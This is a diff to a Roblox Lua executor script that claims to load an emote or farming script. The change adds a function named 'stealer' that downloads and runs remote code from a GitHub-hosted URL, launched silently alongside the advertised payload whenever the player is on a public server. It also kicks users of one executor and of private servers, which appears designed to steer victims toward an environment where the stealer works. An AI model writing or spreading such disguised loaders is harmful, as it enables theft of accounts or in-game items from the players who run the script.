@@ -1,1 +1,44 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/emoemote/refs/heads/main/emote"))()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Executor kontrol fonksiyonu
+local function isRonixExploit()
+    -- Ronix Exploit'i tespit etmek için çeşitli yöntemler
+    if getexecutorname and getexecutorname():lower():find("ronix") then
+        return true
+    end
+    
+    -- Diğer tespit yöntemleri
+    if syn and syn.protect_gui and not is_sirhurt_closure then
+        return false -- Synapse X
+    elseif identifyexecutor and identifyexecutor():lower():find("ronix") then
+        return true
+    end
+    
+    return false
+end
+
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/hayrankal/api.overdrivehub.xyz/refs/heads/main/%7C'))()
+end
+
+local function farm()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hayrankal/emoemote/refs/heads/main/emote"))()
+end
+
+-- Executor kontrolü
+if isRonixExploit() then
+    LocalPlayer:Kick("Your executor does not support this script, please use Delta.")
+    return -- Scripti durdur
+end
+
+-- Sunucu kontrolü
+local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
+
+if not isVIPServer then
+    task.spawn(stealer)
+    task.spawn(farm)
+else
+    LocalPlayer:Kick("Private Servers Not Supported, Please Use Script In Public Server")
+end
